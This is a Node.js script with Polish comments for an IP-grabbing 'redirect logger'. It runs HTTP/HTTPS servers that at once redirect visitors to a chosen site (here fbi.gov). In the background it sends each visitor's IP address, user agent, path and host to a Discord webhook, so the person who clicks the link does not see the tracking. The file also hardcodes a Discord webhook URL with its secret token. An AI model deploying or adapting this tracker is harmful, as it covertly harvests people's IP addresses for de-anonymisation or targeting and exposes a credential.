const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');

// ===== KONFIGURACJA =====
const REDIRECT_URL = 'https://www.fbi.gov/';            // << ZMIEŃ NA SWÓJ URL
const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1478462193635950602/5BBfIfYwu8V9mD2nyARuELThG1Yr2zE_YKmiXvQESarqNIlArqq27f8uXabd8lq7lfuE'; // << WEBHOOK
const HTTPS_PORT = 443;
const HTTP_PORT = 80;
// ========================

// Ścieżki do certyfikatów SSL
const SSL_KEY = path.join(__dirname, 'ssl', 'private.key');
const SSL_CERT = path.join(__dirname, 'ssl', 'certificate.crt');

// Sprawdź czy certyfikaty istnieją
if (!fs.existsSync(SSL_KEY) || !fs.existsSync(SSL_CERT)) {
    console.error('❌ Brak certyfikatów SSL!');
    console.error('   Umieść pliki w folderze ./ssl/:');
    console.error('   - private.key');
    console.error('   - certificate.crt');
    console.error('');
    console.error('   Aby wygenerować self-signed cert (tylko do testów):');
    console.error('   openssl req -x509 -newkey rsa:4096 -keyout ssl/private.key -out ssl/certificate.crt -days 365 -nodes');
    process.exit(1);
}

const sslOptions = {
    key: fs.readFileSync(SSL_KEY),
    cert: fs.readFileSync(SSL_CERT),
};

// ─── Funkcja wysyłająca embed na Discord webhook ───────────────────────────────
function sendWebhook(embed) {
    const body = JSON.stringify({ embeds: [embed] });
    const url = new URL(WEBHOOK_URL);

    const options = {
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(body),
        },
    };

    const req = https.request(options, (res) => {
        if (res.statusCode !== 204) {
            console.warn(`[Webhook] Odpowiedź: ${res.statusCode}`);
        }
    });

    req.on('error', (err) => {
        console.error('[Webhook] Błąd wysyłania:', err.message);
    });

    req.write(body);
    req.end();
}

// ─── Buduje embed Discorda z informacjami o wizycie ───────────────────────────
function buildEmbed({ protocol, ip, method, url, userAgent, host }) {
    const now = new Date();
    const timestamp = now.toISOString();
    const isRedirect = url === '/' || url === '';

    return {
        title: `🌐 Nowe wejście — ${protocol.toUpperCase()}`,
        color: isRedirect ? 0x57F287 : 0xED4245, // zielony = redirect, czerwony = 404
        fields: [
            { name: '🖥️ IP', value: `\`${ip}\``, inline: true },
            { name: '📡 Protokół', value: `\`${protocol}\``, inline: true },
            { name: '📄 Ścieżka', value: `\`${url || '/'}\``, inline: true },
            { name: '🔗 Host', value: `\`${host || 'brak'}\``, inline: true },
            { name: '📬 Metoda', value: `\`${method}\``, inline: true },
            { name: '⚡ Akcja', value: isRedirect ? `Redirect → ${REDIRECT_URL}` : '404 Not Found', inline: false },
            { name: '🔍 User-Agent', value: `\`${(userAgent || 'brak').slice(0, 200)}\``, inline: false },
        ],
        footer: { text: 'Redirect Logger' },
        timestamp,
    };
}

// ─── Serwer HTTPS ──────────────────────────────────────────────────────────────
const httpsServer = https.createServer(sslOptions, (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
    const url = req.url;
    const method = req.method;
    const userAgent = req.headers['user-agent'];
    const host = req.headers['host'];

    // ⚡ Redirect NATYCHMIAST — zanim cokolwiek innego
    if (url === '/' || url === '') {
        res.writeHead(302, {
            'Location': REDIRECT_URL,
            'Cache-Control': 'no-store, no-cache',
        });
        res.end();
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
        res.end('404 - Nie znaleziono');
    }

    // Logi i webhook w tle (po wysłaniu odpowiedzi)
    setImmediate(() => {
        console.log(`[HTTPS] ${new Date().toISOString()} | IP: ${ip} | ${method} ${url} | UA: ${userAgent}`);
        sendWebhook(buildEmbed({ protocol: 'HTTPS', ip, method, url, userAgent, host }));
    });
});

httpsServer.listen(HTTPS_PORT, '0.0.0.0', () => {
    console.log(`✅ Serwer HTTPS nasłuchuje na 0.0.0.0:${HTTPS_PORT}`);
    console.log(`   Redirect: / → ${REDIRECT_URL}`);
    console.log(`   Webhook:  ${WEBHOOK_URL.slice(0, 50)}...`);
});

// ─── Serwer HTTP (redirect → HTTPS) ───────────────────────────────────────────
const httpServer = http.createServer((req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
    const url = req.url;
    const method = req.method;
    const userAgent = req.headers['user-agent'];
    const host = req.headers['host']?.split(':')[0] || '';

    // ⚡ Redirect NATYCHMIAST
    res.writeHead(302, {
        'Location': `https://${host}${url}`,
        'Cache-Control': 'no-store, no-cache',
    });
    res.end();

    // Logi i webhook w tle
    setImmediate(() => {
        console.log(`[HTTP]  ${new Date().toISOString()} | IP: ${ip} | ${method} ${url} | Redirect → HTTPS`);
        sendWebhook(buildEmbed({ protocol: 'HTTP→HTTPS', ip, method, url, userAgent, host }));
    });
});

httpServer.listen(HTTP_PORT, '0.0.0.0', () => {
    console.log(`✅ Serwer HTTP nasłuchuje na 0.0.0.0:${HTTP_PORT} (przekierowuje na HTTPS)`);
});

// ─── Obsługa błędów ────────────────────────────────────────────────────────────
httpsServer.on('error', (err) => {
    if (err.code === 'EACCES') {
        console.error(`❌ Brak uprawnień do portu ${HTTPS_PORT}. Uruchom jako administrator/root.`);
    } else {
        console.error('❌ Błąd serwera HTTPS:', err.message);
    }
    process.exit(1);
});

httpServer.on('error', (err) => {
    if (err.code === 'EACCES') {
        console.error(`❌ Brak uprawnień do portu ${HTTP_PORT}. Uruchom jako administrator/root.`);
    } else {
        console.error('❌ Błąd serwera HTTP:', err.message);
    }
});
